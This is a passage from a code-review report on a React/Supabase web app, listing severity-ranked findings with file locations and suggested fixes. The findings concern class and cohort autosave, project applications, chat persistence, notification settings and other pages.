- **What breaks:** Confirmed. ingestOne/syncReferenceOne catch their own errors and record a per-row 'error' status (66-71, 112-117), so the loops always run to completion and unconditionally call toast.success('All datasets processed!') / toast.success('Reference tables synced'). If all 17 invocations fail (expired admin JWT, edge function down, bad CSV), the admin still sees a top-level success toast and must notice small red per-row icons to realize nothing ingested — a real 'it said success so the knowledge base is updated' trap. Also data.inserted (64) and data.upserted/data.table (102) are read with no shape check, rendering 'undefined entries inserted' if the edge response shape changes.
- **Smallest fix:** Track success/failure counts across the loop and toast success only when failures===0, else toast.error('X of Y failed'). Guard the data.* reads.

### [Medium] Confirmation email keyed off stale React state, not the insert's returned id — a first-time submitter can silently get no email  `error-handling` (CONFIRMED)
- **Where:** src/pages/ProjectApplicationPage.tsx:329-339 (insert does .select('id') then discards it) and 361-367 (email invoked only `if (existingApp?.id)`)
- **What breaks:** Confirmed. The insert branch calls .select('id') but assertWritten consumes it and mutationFn returns nothing (341). onSuccess then gates the send-application-confirmation invoke on the closure value existingApp?.id (361). If the row was created in this same flow and the invalidation refetch (343) hasn't repopulated existingApp — e.g. a user who jumps to step 4 via the StepProgressBar (608-623, which inserts on first save) and submits before the refetch lands — existingApp is null and the confirmation function is never invoked. The comment claims an outbox+sweeper backs it up, but the outbox row is CREATED by that very invoke — skip the invoke and there is nothing to sweep, so the applicant silently gets no submission confirmation.
- **Smallest fix:** Return the inserted/updated id from mutationFn (.select('id').single()) and invoke the confirmation with that concrete id, not the possibly-stale existingApp?.id.

### [Medium] ProjectFormPage edit mode has no lost-update protection — full-row autosave clobbers a concurrent editor's saved changes  `ownership` (PLAUSIBLE)
- **Where:** src/pages/ProjectFormPage.tsx:451-471 (autosave update) and 377-409 (updateMutation), both write the entire sanitized form with no updated_at/version check
- **What breaks:** Every autosave and manual save does supabase.from('projects').update(sanitized).eq('id', id) with the WHOLE form object (all ~17 fields) and no optimistic-concurrency guard (no updated_at precondition, no version column). Two coordinators editing the same project in separate tabs (or one tab left open) is a classic lost update: admin A opens the form (seeds editForm from the row), admin B changes and saves the coordinator + status, then A's 30s autosave fires and blindly writes A's stale full-form snapshot back, silently reverting B's changes to whatever A's tab last held. Because it is a full-row write, even fields A never touched overwrite B. With 767 users and multiple admins this drifts project state with no error and no audit of who won.
- **Smallest fix:** Add optimistic concurrency: carry the loaded updated_at and add .eq('updated_at', loadedUpdatedAt) (or a version column) to the update, treating 0 rows affected as a conflict to surface; or send only changed fields rather than the whole form.
- _added-in-verification_

### [Low] Multi-step navigation advances the UI before the save resolves (optimistic step change on a mutation that can fail)  `error-handling` (CONFIRMED)
- **Where:** src/pages/ProjectApplicationPage.tsx:429-434, 470-475, 608-623
- **What breaks:** Confirmed. handleNext (429-434), handleBack (470-475) and onStepClick (622) all call saveMutation.mutate(...) then immediately setStep(...) without awaiting. If the save fails (RLS, network, the duplicate-insert error above), the user is already on the next step and only sees an error toast; the persisted current_step and the answers for the step they left may not have been written, so a refresh lands them on a different step than the UI showed, and step 1→2 proceeds even if the row was never created.
- **Smallest fix:** Advance the step in the mutation's onSuccess (or await mutateAsync) so navigation happens only after the write is confirmed.

### [Low] Fire-and-forget Discord notification with no error handling  `error-handling` (CONFIRMED)
- **Where:** src/pages/ProjectApplicationPage.tsx:352-358
- **What breaks:** Confirmed. DiscordNotifyService.projectApplied(displayName, projectName, discord, discordId) (358) is called with no await and no .catch — unlike the email invoke right below it (362-366) which has .catch. A rejected promise becomes an unhandled rejection; a synchronous throw interrupts onSuccess after the celebration dialog is opened (351). Either way a coordinator's new-application Discord notification can be lost with no signal.
- **Smallest fix:** Attach a .catch that reportError/logs, matching the email invoke pattern directly below it.

### [Low] Chained enabled-gated queries create a load waterfall on hot applicant/admin pages  `under-engineering` (CONFIRMED)
- **Where:** src/pages/MyProjectApplicationsPage.tsx:92-135 (apps→projects→clients) and src/pages/ApplicationSubmissionDetailPage.tsx:32-68 (app→project→client)
- **What breaks:** Confirmed, with a correction. MyProjectApplicationsPage is a true 3-deep serial waterfall: projects.enabled depends on projectIds from apps, clients.enabled depends on clientIds from projects — 3 sequential round-trips before render. In ApplicationSubmissionDetailPage the critical path is projApp→project→client (3 serial); profile and genApp both key only off projApp.user_id so they run in parallel after projApp, so it is NOT the '5 serial RTTs' the first pass claimed — it is a 3-deep waterfall. Either way, related rows that could load in one embedded select are fetched in sequence, adding latency; MyProjectApplicationsPage re-fetches projects+clients client-side even though public-project-openings already returns projects+clients+stats joined.
- **Smallest fix:** Fetch related rows in one embedded PostgREST select (project_applications.select('*, projects(*, clients(*))')) or a dedicated edge function instead of chaining enabled-gated queries.

### [Low] Admin/status pages over-fetch profiles with select('*'), shipping every profile column to the client  `security` (CONFIRMED)
- **Where:** src/pages/ProjectApplicationPage.tsx:204-208; ProjectApplicationStatusPage.tsx:458-464; ApplicationSubmissionDetailPage.tsx:74-77; RosterApplicantDetailPage.tsx:108-114
- **What breaks:** Confirmed. All four do profiles.select('*') when the UI renders a fixed small set (name, email, country, timezone, discord, urls, a few arrays/text). '*' ships every profile column (including any sensitive/internal field added later) to the browser and couples the pages to the full table shape. Combined with the missing in-component guard + RLS-only enforcement on ApplicationSubmissionDetailPage, it widens what a mis-scoped RLS policy would expose.
- **Smallest fix:** Select the explicit column list each page renders (as ProjectApplicationStatusPage does for projects at 411 and clients at 445), not '*'.

### [Low] Clients/Projects tab switch overwrites the query string, dropping every other search param  `under-engineering` (CONFIRMED)
- **Where:** src/pages/ClientsPage.tsx:21-22 (setSearchParams({ tab: v }))
- **What breaks:** Confirmed. Both the ResponsiveTabs and ResponsiveTabsList onValueChange call setSearchParams({ tab: v }) with a fresh object, wiping every other URL param on tab switch. ProjectOpeningsPage.tsx:145-150 does it correctly (clones existing params, uses replace). Any deep-link param (a future filter, ?highlight=, campaign params) is silently lost when an admin flips tabs, breaking shareable/deep links.
- **Smallest fix:** Clone current params before setting: const next = new URLSearchParams(searchParams); next.set('tab', v); setSearchParams(next, { replace: true }).

### [Low] Dead imports/state in ApplicationsPage (searchParams and defaultTab never used)  `under-engineering` (CONFIRMED)
- **Where:** src/pages/ApplicationsPage.tsx:26 (const [searchParams] = useSearchParams()) and 28 (const defaultTab = 'yours')
- **What breaks:** Confirmed. searchParams is destructured (26) but never read; defaultTab is assigned (28) but never referenced — tab state is separately initialized to 'yours' at 154. Leftover from an earlier URL-driven-tab design; it misleads the next reader into thinking the tab is URL-synced (it isn't), so deep-linking ?tab=all does nothing. Exactly the stale scaffolding the drift rules call out.
- **Smallest fix:** Remove the unused useSearchParams and defaultTab, or actually wire the initial tab from the URL as ProjectOpeningsPage does.

### [Low] ProjectFormPage runs the same fetch twice (dead meta.onSettled + duplicate query) and initializes form state during render  `over-engineering` (CONFIRMED)
- **Where:** src/pages/ProjectFormPage.tsx:162-224
- **What breaks:** Confirmed. Two useQuery calls (['project', id] at 162 and ['project-init', id] at 195) both run fetchProjectWithLinks, so every edit load does two identical fetches, each a projects select + get_project_internal_links RPC (152-155). The first relies on meta.onSettled, which the code's own comment (194) says 'doesn't work in all versions' — dead. The second drives init via setForm/setInitialized called directly in the render body (203-224), a setState-during-render pattern. Result: double the round-trips and RPCs per edit plus a fragile render-phase init.
- **Smallest fix:** Keep one query and initialize from its data in a useEffect (or onSuccess); delete the dead meta.onSettled query and the duplicate fetch.

### [Low] Project application can be submitted to a project no longer accepting applications — submit path never re-checks project_status  `error-handling` (PLAUSIBLE)
- **Where:** src/pages/ProjectApplicationPage.tsx:316-340 (submit sets status=completed) — no project_status guard; contrast ProjectOpeningDetailPage.tsx:323-327,654 which gate the Apply button on project_status==='apply_now'
- **What breaks:** The Apply/Edit button on the detail page only appears when project_status==='apply_now' (323-327, 654), but the application page and its submit mutation never re-verify that the project is still open. A user with a draft (or a bookmarked /apply URL) can open the page and submit after an admin has moved the project to recruiting/team_onboarding/complete — the insert/update with status='completed' (316-319) succeeds, the applicant sees the celebration dialog and gets a confirmation, and the late application lands in the coordinator's completed pile after selection has begun. Nothing server-side rejects it (RLS gates ownership, not project phase).
- **Smallest fix:** Re-check project.project_status==='apply_now' in handleSubmit before the submit mutation (and ideally enforce it in the edge function / an RLS or trigger check), showing a 'this project is no longer accepting applications' state otherwise.
- _added-in-verification_

---

## Classes, cohorts, curriculum & course pages

### [High] UI component reaches past hooks/services straight into the DB for an authorization decision  `dependency` (CONFIRMED)
- **Where:** src/pages/ClassDetailPage.tsx:54-68 (import line 28 `import { supabase } from "@/integrations/supabase/client"`); gate at line 87
- **What breaks:** Verified: the page runs `supabase.from("cohort_registrations").select("cohorts!inner(class_id)")...` inline (lines 58-63) to compute `isEnrolled`, which feeds `canSeeCurriculum = canEdit || isEnrolled` (line 87) — an access-control gate. This violates the mandated layering (UI must not touch the DB). Consequences: (1) the enrollment query lives nowhere reusable, so the next page needing 'is this user enrolled' copy-pastes it; (2) it bypasses the `retryPostgrest` wrapper every service query uses (class.service.ts:36,49,69), so a transient blip yields `isEnrolled=false` and hides curriculum from a paying learner; (3) enrollment logic and the cohorts/registrations tables are now read from two layers, so an RLS/schema change must be hunted in components, not just services.
- **Smallest fix:** Move the query into a `useClassEnrollment(classId, userId)` hook backed by an EnrollmentService method wrapped in `retryPostgrest`; delete the `supabase` import from the page.

### [High] Prerequisites have two writers; autosave persists the stale loaded list and silently drops the owner's edits  `ownership` (CONFIRMED)
- **Where:** src/pages/ClassFormPage.tsx:73 (prereqText state), :86 (autosave saves values.prerequisites), :130/:135 (reset seeds both), :143 (submit uses csvToList(prereqText))
- **What breaks:** Verified two sources of truth: the textarea writes only local `prereqText` (line 322), while the form model also carries `prerequisites` (defaults line 60, reset line 130). They are never synced while typing. Autosave (line 86) saves `values.prerequisites` = the last reset/loaded value, NOT what the user is typing; explicit submit (line 143) instead uses `csvToList(prereqText)`. So while an owner edits an existing class, every autosave rewrites the row's prerequisites to the pre-edit loaded list and silently discards the in-progress textarea edits; a reviewer (or the owner) who reloads mid-edit sees the old list, not what was typed. On a new-class draft the form value is `[]`, so autosave persists empty prerequisites. Two writers that disagree by construction.
- **Smallest fix:** Make the textarea the single owner: register it as a controlled field applying csvToList in setValue, or delete form.prerequisites and have autosave read csvToList(prereqText). One value, one writer.

### [High] Class autosave writes an owner's unvalidated form buffer over a class under review/published via stale cached status  `ownership` (CONFIRMED)
- **Where:** src/pages/ClassFormPage.tsx:76-88 (canAutosave); src/hooks/use-classes.ts:32-39 (useClassById uses CACHE_USER_MUTABLE)
- **What breaks:** Verified: `canAutosave` reads `existing.status` from a CACHE_USER_MUTABLE-cached query. It excludes only `pending_review`, `approved`, `archived` — and `approved` is not even a valid ClassStatus (class.ts:12 = draft|pending_review|published|archived), so that guard is dead. `published` is NOT excluded. If an admin approves/publishes while the owner holds the edit page (cached status still `draft`), autosave keeps calling `ClassService.update(id, watchedRawValues)` (line 86), writing the owner's in-progress buffer straight over the now-published row. Autosave also bypasses the zodResolver that guards submit (no zod parse on the watched values), so oversized/invalid HTML reaches ClassService.update unchecked. At scale with admins reviewing while owners edit this is a live partial-commit race and a validation bypass.
- **Smallest fix:** Gate autosave on server truth (refetch status before each autosave and reject non-draft), route autosave values through the same zod parse as submit, and drop the meaningless `approved` guard.

### [High] Owner can silently mutate a PUBLISHED class with no re-review — 'published' is missing from the autosave exclusion list  `ownership` (CONFIRMED)
- **Where:** src/pages/ClassFormPage.tsx:76-79 (canAutosave excludes only pending_review/approved/archived)
- **What breaks:** Independent of any cache race: because `canAutosave` never excludes `published`, an owner opening the edit page for an already-published, cache-fresh class satisfies canAutosave and every keystroke autosaves directly into the live published row (title, summary, description, curriculum, etc.) — no resubmission, no admin re-review, and no zod validation. The class review/approval workflow is fully bypassable for any published class simply by editing it. Cohorts are correctly restricted to draft|pending_review (CohortFormPage.tsx:103-107); classes are not.
- **Smallest fix:** Restrict class autosave to `draft` only (mirror the cohort rule); require explicit resubmit-for-review to change a published class.
- _added-in-verification_

### [High] Three class columns exist only as inline `as {...}` casts — a rename drops learner content with no type error  `under-engineering` (CONFIRMED)
- **Where:** src/services/class.service.ts:11-32 (ClassRow lacks curriculum/reading_assignments/class_expectations); read via casts in ClassDetailPage.tsx:201,209,215,224,231,240 and ClassFormPage.tsx:131-133
- **What breaks:** Verified: curriculum, reading_assignments, class_expectations are written by create/update (class.service.ts:100-102) and validated by zod (class.ts:30-32), yet the exported ClassRow type (the layer's contract) omits all three. Every consumer casts `(cls as { curriculum?: string })`, defeating TypeScript for these fields. Rename or drop one of these columns in a migration and nothing fails to compile — the cast resolves to `undefined`, the `?.trim()` guard hides it, and the section silently stops rendering (and, on the next autosave/update spreading `values`, may stop persisting). Stored learner content lost, presented as an empty section. NOTE: the first pass also listed cohort `schedule` here — that is a false positive: CohortRow.schedule IS declared (cohort.service.ts:19); the `(c as { schedule?: string })` casts in ClassDetailPage:337/345 and CohortFormPage:73 are merely redundant, not a type hole.
- **Smallest fix:** Add the three fields to ClassRow in class.service.ts and delete every `(x as {...})` curriculum/reading/expectations cast so the compiler enforces the schema; drop the redundant CohortRow.schedule casts too.

### [Medium] Numeric capacity is autosaved as a raw string, bypassing the zod coercion the submit path relies on  `boundary` (CONFIRMED)
- **Where:** src/pages/CohortFormPage.tsx:217 (`{...form.register("capacity")}`, no valueAsNumber), :108-116 (autosave sends raw watched)
- **What breaks:** Verified nuance the first pass missed: the zod schema DOES coerce capacity (cohort.ts:30-31: `z.coerce.number()` / `""→null`), so the SUBMIT path (onSubmit receives parsed values) and create are safe. But autosave calls `CohortService.update(cohortId, values as CohortFormValues)` (line 114) with raw `form.watch()` values that are never zod-parsed. `register('capacity')` with no `valueAsNumber` holds the field as a string, so autosave sends `capacity: "25"` or `""` to CohortService.update; `update` spreads it verbatim (cohort.service.ts:90) into a nullable integer column — `""` yields a PostgREST 400 that makes AutosaveStatus retry in a loop, and `"25"` relies on PG string coercion. The whole autosave path for cohorts is unvalidated (schedule HTML size, dates, URLs too).
- **Smallest fix:** Register capacity with `{ valueAsNumber: true }`, and route autosave values through the same zod parse as submit so an empty field becomes null and every field is validated before CohortService.update.

### [Medium] Registration-click analytics is a floating promise with a swallowed error and a silent no-user return  `error-handling` (CONFIRMED)
- **Where:** src/pages/ClassDetailPage.tsx:309-311 (`.catch(() => undefined)`); src/services/cohort.service.ts:116-125 (silent `if (!userId) return`)
- **What breaks:** Verified: the Register button records the click via `CohortService.recordRegistrationClick(c.id).catch(() => undefined)` — the rejection is discarded (not recovered, retried, or reported). `recordRegistrationClick` also returns silently when there's no user (cohort.service.ts:119) and never wraps the RPC in the transient-retry helper. So the registration-funnel metric used to judge which cohorts convert under-counts whenever the RPC errors, RLS blocks it, or the session is momentarily unauthenticated, and no one ever learns the numbers are wrong.
- **Smallest fix:** Report the failure to the app error reporter (and wrap the RPC in retryPostgrest); do not discard the rejection.

### [Medium] N+1 audit-history query: one PostgREST round-trip per draft row in the grid  `under-engineering` (CONFIRMED)
- **Where:** src/pages/MyClassesPage.tsx:29-46 (ChangesRequestedChip), rendered per draft row at :98
- **What breaks:** Verified: `ChangesRequestedChip` runs its own `useQuery(['classes','audit',classId], listAuditHistory)` for every row where `status === 'draft'` (line 98). listAuditHistory fetches up to 50 `class_audit` rows (class.service.ts:169-176) purely to check whether one `request_changes` row exists. A user with N draft classes fires N separate audit queries on load (up to the 25 page size), and ag-grid re-mounts cell renderers on sort/filter/scroll, re-firing them. 50 rows fetched per class to test existence of one.
- **Smallest fix:** Return a `has_changes_requested`/`latest_change_reason` field on the class list payload (or one batched audit query keyed by class ids) and read it from row data instead of a per-cell query.

### [Medium] Approve invalidates only the classes cache, leaving cohort lists stale after cohorts go live  `ownership` (CONFIRMED)
- **Where:** src/pages/AdminClassesPage.tsx:79-81 (approve invalidates only ['classes']); dialog at :299-303 says cohorts also go live
- **What breaks:** Verified: `approveAndPublish` publishes the class and (per the dialog copy and RPC name `approve_and_publish_class`) any pending cohorts, but the handler only `invalidateQueries({ queryKey: ['classes'] })`. Cohort queries are keyed `['cohorts','class',classId,...]` / `['cohorts','byId',...]` (use-cohorts.ts:7,21). After approve, any open ClassDetailPage keeps showing just-published cohorts with their old status and wrong action buttons, and the learner-facing published-cohort list won't reflect the new live cohorts until cache expiry. RPC and client cache disagree about cohort status.
- **Smallest fix:** After approve, also `invalidateQueries({ queryKey: ['cohorts'] })` (prefix) alongside ['classes'].

### [Medium] submitCohort refreshes only the classes cache, so the cohort keeps showing 'draft' with a Submit button after submission  `ownership` (CONFIRMED)
- **Where:** src/pages/ClassDetailPage.tsx:85 (refresh = invalidate ['classes']), :89-97 (submitCohort calls refresh only)
- **What breaks:** After `CohortService.submitForReview` flips a cohort to pending_review, `submitCohort` (line 93) calls `refresh()`, which invalidates only `['classes']`. The cohort list on this very page comes from `useCohortsByClass` keyed `['cohorts','class',id,'all']` (use-cohorts.ts:7) and is never invalidated. So immediately after a successful submit the owner still sees the cohort badged `draft` (line 304) with the Submit button (line 330) and can click Submit again against an already-submitted cohort until the cache expires. Same class of RPC-vs-cache drift as the approve handler, on the owner's happy path.
- **Smallest fix:** Have submitCohort invalidate `['cohorts', 'class', cls.id]` (or the `['cohorts']` prefix) in addition to ['classes'].
- _added-in-verification_

### [Medium] Status emails are fire-and-forget: approve/submit/changes/archive succeed but notification failure is invisible  `error-handling` (CONFIRMED)
- **Where:** src/services/class.service.ts:133,139,148,157 (`void sendClassStatusEmails(...)`)
- **What breaks:** Verified: every class state transition fires `void sendClassStatusEmails(...)` with the promise explicitly discarded. If the email edge function is down, rate-limited, or throws, the owner is never told their class was approved / changes were requested / archived — no retry, no surfaced log, no toast to the actor. Owners silently stop finding out about review decisions (the entire point of the workflow) and no one detects the outage. Note the cohort submit path (cohort.service.ts:99-106) sends no email at all (see divergent-submit finding).
- **Smallest fix:** Capture the rejection and report it (error reporter + optional non-blocking toast), or enqueue emails through a durable path instead of a discarded floating promise.

### [Medium] Cohort autosave permitted while status = pending_review lets an owner mutate a cohort mid-review  `ownership` (CONFIRMED)
- **Where:** src/pages/CohortFormPage.tsx:103-116 (canAutosave allows 'pending_review')
- **What breaks:** Verified: `canAutosave` is true when `existing.status === 'draft' || 'pending_review'` (line 107). While a cohort sits queued for admin review, the owner's edits autosave straight into the row the admin is evaluating — dates, registration_url, meeting_url, schedule. The admin can approve a version different from the one they read seconds earlier, including a swapped `registration_url` to an arbitrary external link after visual review but before approval. Combined with cached-status staleness this is a review-integrity hole, and (per the capacity finding) these autosaves are unvalidated by zod.
- **Smallest fix:** Restrict cohort autosave to `draft` only; require an explicit resubmit for any edit made after submission.

### [Medium] Curriculum visibility is a client-only gate derived from a stale, time-lagged enrollment cache  `security` (PLAUSIBLE)
- **Where:** src/pages/ClassDetailPage.tsx:54-68,87,260-272 (`canSeeCurriculum = canEdit || isEnrolled`, staleTime 60_000, limit(1))
- **What breaks:** Whether the Curriculum tab and LearnerCurriculumView mount is decided entirely in the browser from a cached enrollment lookup. (1) It is client-side gating — the real protection must live in RLS and the curriculum data hook; if LearnerCurriculumView's own fetch (src/features/class-curriculum) is not independently RLS-scoped to enrolled users, hiding the tab is security theater and a determined user can fetch curriculum for a class they never enrolled in. (Marked PLAUSIBLE: LearnerCurriculumView's fetch was not in scope to confirm.) (2) `staleTime: 60_000` plus the cached result means a user just removed from a cohort keeps seeing curriculum for up to a minute, and a just-enrolled user is wrongly told there's none.
- **Smallest fix:** Confirm/enforce curriculum access in RLS and the curriculum data hook itself; treat client `isEnrolled` purely as a display hint so the visibility toggle is never the only line of defense.

### [Low] Two service methods wrap the same submit RPC with divergent side effects — cohort submit sends no email  `over-engineering` (CONFIRMED)
- **Where:** src/services/class.service.ts:127-134 (submitForReview + email) vs src/services/cohort.service.ts:99-106 (submitForReview, no email); caller ClassDetailPage.tsx:91
- **What breaks:** Verified: both `ClassService.submitForReview` and `CohortService.submitForReview` call the identical `submit_class_for_review` RPC, but only the class variant also fires `sendClassStatusEmails(id, 'submitted')`. `ClassDetailPage.submitCohort` (line 91) calls the Cohort variant, so submitting a cohort for review sends NO submission email while submitting via the class path does. Same workflow, two entry points, inconsistent side effects — a maintainer fixing submit behavior patches one and misses the other.
- **Smallest fix:** Collapse to a single submit method (or have the cohort path delegate to the class path) so the email side-effect is not path-dependent.

### [Low] TrainingPage mount fires ~11 independent per-user queries that could be batched  `under-engineering` (CONFIRMED)
- **Where:** src/pages/TrainingPage.tsx:210-225 (8x useCompletedCount) + :231 useCourseCompletionCounts + :332-333 usePublishedClassesByTrack x2
- **What breaks:** Verified: every load of the Courses page issues eight separate `useCompletedCount` queries (one per phase), a completion-counts query, and two published-class queries — ~11 round-trips for one screen, per user, uncached on first visit. `useCompletedCount` already accepts a phase + optional task_ids, so the eight are trivially batchable. Any one failing degrades silently (all default to 0/{}).
- **Smallest fix:** Add one RPC/view returning per-phase completed counts for the user in a single call, keeping the two class-track queries.

### [Low] Cohort form's onSubmit swallows every handleSubmit rejection, not just field validation  `error-handling` (CONFIRMED)
- **Where:** src/pages/CohortFormPage.tsx:176-181 (`void form.handleSubmit(onSubmit)(e).catch(() => {})`)
- **What breaks:** Verified: the comment justifies `.catch(() => {})` as suppressing the resolver's field-validation rejection so it doesn't reach the global error reporter, but the catch is unconditional — it also swallows any unexpected throw from the submit pipeline that isn't a rendered field error. A non-validation error from onSubmit vanishes with no report. The blanket catch is broader than the stated intent.
- **Smallest fix:** Narrow the catch to ignore only the known validation-rejection shape and rethrow/report anything else.

### [Low] Admin search re-parses every class's HTML summary via DOM on each keystroke  `under-engineering` (CONFIRMED)
- **Where:** src/pages/AdminClassesPage.tsx:66-73 (`stripHtml(c.summary)` inside the filter, useMemo keyed on q)
- **What breaks:** Verified: `stripHtml` (the DOM-parser-based helper) runs inside `classes.filter(...)` on the full list on every non-empty search keystroke (line 71). For a small catalog it's fine; as classes grow this is O(classes) synchronous DOM parses per keystroke on the main thread and will jank the admin search box.
- **Smallest fix:** Precompute a stripped, lowercased search-text field per class once (memoized on `classes`) and match `q` against that.

### [Low] 'Needs attention' bucket and the changes-requested chip use two different definitions  `other` (CONFIRMED)
- **Where:** src/pages/MyClassesPage.tsx:62-75 (attention == status 'draft') vs :98 chip driven by an audit query
- **What breaks:** Verified: 'Needs your attention' is defined purely as `status === 'draft'` (lines 64, 72) and counted from status alone, while ChangesRequestedChip is driven by an actual `request_changes` audit query (lines 30-34). The tab count and the badges inside it derive from two different signals and can disagree — a class the chip flags 'Changes requested' is not necessarily what the attention count reflects, and vice versa.
- **Smallest fix:** Derive 'attention' from the same signal that drives the chip (an unresolved request_changes) rather than duplicating a status heuristic.

### [Low] Dead viewer-completed parameter threaded through the completers formatter  `other` (CONFIRMED)
- **Where:** src/pages/TrainingPage.tsx:61 (`formatCompleters(n, _viewerCompleted)`) and call site :179
- **What breaks:** Verified: `formatCompleters` takes `_viewerCompleted` and never uses it (comment: count now includes the viewer), yet the call site still passes `isComplete` (line 179). Harmless at runtime, but it's patch-on-patch residue — the next reader assumes the viewer flag matters and wires new logic onto a dead argument.
- **Smallest fix:** Drop the unused parameter and its call-site argument.

---

## Community, events, resources, notifications & Fleety pages

### [High] Direct profiles writes from UI bypass ProfileService's XSS sanitization + mass-assignment allow-list  `security` (CONFIRMED)
- **Where:** src/pages/NotificationSettingsPage.tsx:136-139 (notification_prefs) and :156-159 (notify_opportunities); read at :86-90
- **What breaks:** Verified: the page calls supabase.from("profiles").update({...}) directly for both writes. ProfileService.updateFields (src/services/profile.service.ts:157-202) is the only sanitized/allow-listed write path — it runs pickAllowedFields + deepSanitize — and its ALLOWED_PROFILE_FIELDS list (:160-179) does not even contain notification_prefs or notify_opportunities, so this page is provably a second, unguarded write path to a table meant to have exactly one. notification_prefs is a client-supplied JSON blob (Prefs = Record<string,'on'|'off'>) written verbatim: nothing constrains its keys/values/size, and deepSanitize never runs on it. A member or compromised client can PATCH arbitrary JSON into the column; any future feature trusting profiles.notification_prefs to be well-formed/sanitized inherits stored-XSS/injection.
- **Smallest fix:** Add updateNotificationPrefs / setNotifyOpportunities to ProfileService (through deepSanitize + an extended allow-list) and call those; delete the direct supabase.from("profiles") calls here.

### [High] ChatPage persists conversations/messages with direct DB calls and zero error handling — silent, total chat loss  `error-handling` (CONFIRMED)
- **Where:** src/pages/ChatPage.tsx:330-341 (saveMessage), :314-328 (createConversation), :439-444 (onDone save)
- **What breaks:** Verified: saveMessage (:330-341) fires two awaited supabase insert/update calls and checks neither result — a failed insert (RLS denial, network blip, row-size limit) leaves the answer on screen but unstored, gone on reload with no error shown. createConversation (:322-325) on error only console.errors and returns null; send() then guards persistence with `if (convoId) await saveMessage(...)` (:389, :442), so a null convoId silently drops the entire turn — user message and assistant answer — while the UI looks successful. At 767 users any transient PostgREST hiccup becomes invisible data loss. Catches that neither recover, retry, nor report.
- **Smallest fix:** Move persistence into a chat service + React Query mutation; surface insert/update errors via toast + retry, and treat createConversation failure as a hard reported error, not a silent null.

### [Medium] Chat persistence lives in the UI component instead of a hook/service layer  `boundary` (CONFIRMED)
- **Where:** src/pages/ChatPage.tsx:223-350 (loadConversations, loadMessages, createConversation, saveMessage, deleteConversation all call supabase.from(...) directly)
- **What breaks:** Verified: all five persistence functions hit the Supabase client directly from the page, with manual useState caches, no query keys, no invalidation, no dedup. No other surface (mobile, a widget, TAL9000 terminal) can find or reuse conversation history — it will be copied and drift. loadConversations (:225-228) selects id/title/updated_at with no .limit(), so a heavy user's sidebar list grows unbounded.
- **Smallest fix:** Extract chat.service.ts + use-chat-conversations/use-chat-messages hooks with proper query keys, pagination and cache invalidation; ChatPage consumes only the hooks.

### [Medium] Conversation updated_at is written from the client clock, racing the DB and reordering history  `ownership` (CONFIRMED)
- **Where:** src/pages/ChatPage.tsx:337-340 (update({ updated_at: new Date().toISOString() }))
- **What breaks:** Verified: saveMessage writes updated_at from the client clock, and the sidebar sorts on it (:228 order updated_at descending). Two rapid messages, or a device with a skewed clock, write out-of-order timestamps and the sidebar ordering becomes wrong/unstable. A sort key must have one owner (a DB default/trigger), not be set by every client that saves a message.
- **Smallest fix:** Let the DB own updated_at via a trigger on chat_messages insert (or DEFAULT now()); remove the client-side timestamp write.

### [Medium] Hand-rolled SSE parser duplicated across four surfaces; an unparseable frame stalls the rest of the stream  `under-engineering` (CONFIRMED)
- **Where:** src/pages/ChatPage.tsx:48-161 (streamChat), parse fallback :135-138, final flush :142-158, history send :424
- **What breaks:** Verified: the comment at :65-67 states this same SSE-parse/auth logic is duplicated in FleetyChatWidget, GuidanceEmbed, and stream-chat.ts — four copies of a network protocol to keep in sync. The catch at :135-138 re-prepends the failed line to textBuffer and breaks the inner loop; for a genuinely malformed frame (not a partial chunk) that line can never parse, so every subsequent read re-slices the same line, fails, re-prepends and breaks — no further deltas are processed for the rest of the stream, and the member sees a truncated answer with no error. The full message history is re-sent every turn (:424 messages:[...messages,userMsg]), growing the payload unboundedly toward cost/413 limits.
- **Smallest fix:** Extract one shared streaming client used by all four surfaces; distinguish 'partial chunk' from 'unparseable frame' and surface the latter; cap/trim history sent upstream.

### [Medium] Events timezone stored in both localStorage and profile, with localStorage silently winning forever  `ownership` (CONFIRMED)
- **Where:** src/pages/EventsPage.tsx:31-48 (init reads localStorage first :33-34; adopt-profile effect early-returns at :46 if TZ_KEY present); handleTzChange :50-57
- **What breaks:** Verified: initial state prefers localStorage TZ_KEY over profile.timezone (:33-40), and the adopt-profile effect returns early whenever localStorage.getItem(TZ_KEY) exists (:46). Once a member touches the tz selector (TZ_KEY set at :53) the profile value is permanently ignored on that device, and handleTzChange never writes back to the profile — so a member who later corrects their timezone in profile settings still sees Events in the stale local value, on that device only, with no indication why. Two copies of one fact that disagree forever.
- **Smallest fix:** Treat profile.timezone as source of truth; use localStorage only as a pre-profile-load cache that reconciles to the profile value once it arrives, and write user picks back through the profile owner.

### [Medium] Unfiltered realtime subscription triggers a support-query invalidation storm at scale  `other` (CONFIRMED)
- **Where:** src/pages/community/GetHelpPage.tsx:192-204 (postgres_changes event:'*' on support_ticket_events and support_ticket_pointers, no filter)
- **What breaks:** Verified: the subscription listens to ALL changes (event:'*') on both tables with no row filter — RLS is the only scope — and every event calls qc.invalidateQueries(['support']) -> refetch through the freescout-proxy edge function. For admins (who see every ticket) that is a refetch on essentially every ticket event platform-wide; with 767 users and multiple admins online, one busy support hour becomes a self-inflicted DoS on freescout-proxy. If RLS on either table is less than perfectly scoped, members also receive change events for tickets that aren't theirs (RLS-dependent, PLAUSIBLE).
- **Smallest fix:** Add a server-side row filter (viewer's user_id / ticket ownership) to the postgres_changes subscriptions and debounce the invalidation; verify RLS on both tables independently.

### [Medium] Announcement media is uploaded before create; a failed create orphans the video/audio in storage  `error-handling` (CONFIRMED)
- **Where:** src/pages/UpdatesPage.tsx:150-187 (handleCreate), media set via MediaRecorder onMediaReady :511-525
- **What breaks:** Verified: MediaRecorder.onMediaReady (:511-525) uploads and stores the URL into newVideoUrl/newAudioUrl before any row exists. handleCreate awaits createMutation.mutateAsync (:169-176); on rejection the catch (:184-186) only toasts and leaves newVideoUrl/newAudioUrl set — the already-uploaded blob is orphaned in storage with no row referencing it and no cleanup. Repeated failed attempts accumulate orphaned (potentially large) media. The catch reports but does not recover the half-committed state.
- **Smallest fix:** Upload media as part of the create transaction/edge function, or on create failure delete the just-uploaded media and clear the URLs so no orphan remains.

### [Medium] Read-modify-write of the notification_prefs JSON blob loses concurrent toggles  `ownership` (CONFIRMED)
- **Where:** src/pages/NotificationSettingsPage.tsx:131-149 (toggle): next = { ...prefs, [key] } then update whole blob
